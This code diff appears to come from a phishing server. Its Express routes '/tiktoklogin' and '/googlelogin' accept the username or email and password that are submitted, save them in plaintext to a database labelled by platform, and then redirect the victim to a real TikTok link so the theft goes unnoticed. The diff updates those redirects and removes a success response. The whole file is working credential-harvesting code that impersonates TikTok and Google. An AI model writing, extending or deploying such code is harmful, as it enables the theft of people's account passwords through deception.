@@ -45,16 +45,16 @@ app.post('/tiktoklogin', async (req, res) => {
     try {
         const newUser = new User({ username, password, platform: 'TikTok' });
         await newUser.save();
-        res.redirect("https://www.tiktok.com/en/")
+        res.redirect("https://vm.tiktok.com/ZMkN6UWmy/")
     } catch (error) {
         res.status(500).json({ error: 'Retry something went wrong' });
     }
 });
 app.get("/tiktoklogin",(req,res)=>{
- res.redirect("https://www.tiktok.com/en/")
+ res.redirect("https://vm.tiktok.com/ZMkN6UWmy/")
 })
 app.get("/googlelogin",(req,res)=>{
-    res.redirect("https://www.tiktok.com/en/")
+    res.redirect("https://vm.tiktok.com/ZMkN6UWmy/")
    });
 
 // Google login route
@@ -64,7 +64,6 @@ app.post('/googlelogin', async (req, res) => {
     try {
         const newUser = new User({ email, password, platform: 'Google' });
         await newUser.save();
-        res.status(201).json({ message: 'Google login data saved successfully.' });
     } catch (error) {
         res.status(500).json({ error: 'Failed to save data.' });
     }
